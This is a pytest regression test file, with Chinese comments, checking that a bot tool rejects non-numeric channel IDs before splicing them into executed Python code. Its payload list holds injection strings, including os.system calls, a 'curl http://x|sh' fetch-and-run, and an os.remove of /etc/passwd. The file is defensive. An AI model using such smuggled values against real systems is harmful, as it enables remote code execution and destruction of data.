"""clear_context 的 channel_id 注入回归。

这个值会被拼进一段 Python 源码，送到 Bot 进程执行：

    {"code": f"_channel_history[{channel_id}] = []\\nreturn {{'cleared': True}}"}

不是纯数字就等于任意代码。工具本身在 qq.orchestrator 的白名单里，等于群里
任何人都能借它在 Bot 进程内执行代码。
"""
from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest

_ROOT = Path(__file__).resolve().parents[1]
_TOOL = _ROOT / "tools" / "clear_context.py"

_PAYLOADS = [
    "0]; __import__('os').system('id') #",
    "1] = []; import os; os.system('curl http://x|sh') #",
    "__import__('subprocess').getoutput('whoami')",
    "0]\nimport os\nos.remove('/etc/passwd')\n#",
    "",
    "abc",
    "12.5",
    "-1",
    "0x1f",
    "１２３",  # 全角：int() 认，但拼进源码和 conversation_key 会对不上
]


def _run(channel_id: str) -> dict:
    proc = subprocess.run(
        [sys.executable, str(_TOOL)],
        input=json.dumps({"channel_id": channel_id}),
        capture_output=True,
        text=True,
        encoding="utf-8",
        env={"PYTHONIOENCODING": "utf-8", "PATH": ""},
        cwd=str(_ROOT),
        timeout=30,
    )
    return json.loads(proc.stdout.strip().splitlines()[-1])


@pytest.mark.parametrize("payload", _PAYLOADS)
def test_non_numeric_channel_id_is_refused(payload: str) -> None:
    out = _run(payload)

    assert out["ok"] is False
    # 必须在拼代码之前就拒掉 —— 报网络错误说明它已经把 payload 发出去了。
    assert "numeric" in out["error"] or "required" in out["error"]


def test_numeric_id_passes_validation() -> None:
    """合法输入不该被这道校验挡住。它连不上 Bot 端口，但错误应该是连接失败而不是校验失败。"""
    out = _run("987654321012345678")

    assert "numeric" not in str(out.get("error", ""))
